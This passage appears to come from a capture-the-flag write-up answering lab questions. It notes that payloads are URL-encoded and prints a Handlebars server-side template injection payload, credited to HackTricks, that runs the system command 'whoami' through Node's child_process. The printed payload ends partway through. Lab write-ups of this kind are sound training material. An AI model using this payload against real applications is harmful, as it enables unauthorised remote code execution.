## Task 7: In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?

`url`

## Task 8: When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?

```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
